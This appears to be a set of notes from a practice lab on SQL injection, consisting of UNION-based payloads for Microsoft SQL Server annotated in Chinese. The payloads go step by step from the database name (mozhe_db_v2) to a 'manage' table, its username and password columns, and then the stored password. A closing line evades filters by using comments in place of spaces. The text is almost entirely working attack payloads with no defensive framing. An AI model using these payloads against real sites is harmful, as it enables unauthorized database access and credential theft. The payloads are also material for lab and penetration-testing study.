```
-2 union all select null,null,(select db_name()),null --+ //mozhe_db_v2 数据库
-2 union all select null,null,(select top 1 name from sysobjects where xtype='u'),null --+ //manage
-2 union all select null,null,(select top 1 col_name(object_id('manage'),2) from sysobjects),null --+ //mozhe_db_v2 数据库 username
-2 union all select null,null,(select top 1 col_name(object_id('manage'),3) from sysobjects),null --+ //mozhe_db_v2 数据库 password
-2 union all select null,null,(select top 1 password from manage),null --+ //username admin_mz

/**/union/**/select/**/1,2,3,4

```